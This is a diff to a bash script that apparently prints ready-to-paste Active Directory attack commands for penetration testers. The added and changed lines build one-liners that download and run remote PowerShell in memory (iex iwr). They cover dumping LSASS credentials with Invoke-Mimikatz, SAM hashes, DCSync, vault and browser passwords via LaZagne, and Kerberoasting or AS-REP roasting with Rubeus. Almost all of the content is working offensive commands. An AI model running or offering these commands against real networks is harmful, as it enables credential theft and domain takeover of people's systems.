@@ -20,7 +20,7 @@ baseLDAP="";	#
 DC="";		#
 NS="IP";	#
 
-EmpireRepo="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/";
+EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
@@ -28,7 +28,7 @@ PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/m
 S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 
 iwr="iex (iwr -usebasicparsing "
-DownloadMethod=""
+DownloadMethod="$iwr"
 
 
 # Wordlists
@@ -105,7 +105,8 @@ while [ $# -gt 0 ]; do
                 LDAP="'$2'";
                 shift
                 shift
-                ;;          
+                ;;
+       
                                                                                                                                         
                 
         *)
@@ -333,7 +334,7 @@ echo -e ""
 
 # BloodHound
 echo -e "${LGREEN}BloodHound${RESTORE}"
-echo -e "${LRED} WORK IN PROGRESS${RESTORE}"
+echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
 echo -e "${RED}https://github.com/fox-it/BloodHound.py${RESTORE}"
 echo -e ""
 echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
@@ -482,17 +483,15 @@ echo -e ""
 echo -e "${LGREEN}Credential Dumping${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}LSASS Memory${RESTORE}"
-echo -e "$iwr "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
 echo -e ""
 echo -e "${IBLUE}SAM${RESTORE}"
-echo -e "$iwr '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
+echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
 echo -e ""
 echo -e "${IBLUE}NTDS${RESTORE}"
-echo -e "${LRED} WORK IN PROGRESS${RESTORE}"
-echo -n -e "$iwr $PentestFactoryRepo""/Invoke-DCSync.ps1');Invoke-DCSync"
+echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}NTDS${RESTORE}"
-echo -e "${LRED} WORK IN PROGRESS${RESTORE}"
+echo -e "$DownloadMethod $PentestFactoryRepo""/Invoke-DCSync.ps1');Invoke-DCSync"
 echo -e ""
 echo -e "${IBLUE}Cached Domain Credentials${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
@@ -500,19 +499,32 @@ echo -e ""
 echo -e ""
 echo -e "${IBLUE}Credentials From Web Browsers${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe browsers"
-echo -e "$iwr '$NishangRepo""Gather/Get-WebCredentials.ps1');Get-WebCredentials"
+echo -e "$DownloadMethod '$NishangRepo""Gather/Get-WebCredentials.ps1');Get-WebCredentials | FL"
 echo -e ""
 echo -e ""
 echo -e "${IBLUE}Windows Credential Manager${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
-echo -e "$iwr $PowerSploitRepo"Exfiltration/Get-VaultCredential.ps1");Get-VaultCredential"
+echo -e "$DownloadMethod $PowerSploitRepo"Exfiltration/Get-VaultCredential.ps1");Get-VaultCredential"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+# Unsecured Credentials
 echo -e ""
 echo -e "${LGREEN}Unsecured Credentials${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Credentials in Files${RESTORE}"
-echo -e "$iwr $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher"
+echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher"
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+# Steal or Forge Kerberos Tickets
+echo -e ""
+echo -e "${LGREEN}Steal or Forge Kerberos Tickets${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}AS-REP Roasting${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command asreproast"
+echo -e ""
+echo -e "${IBLUE}Kerberoasting${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command kerberoast"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 
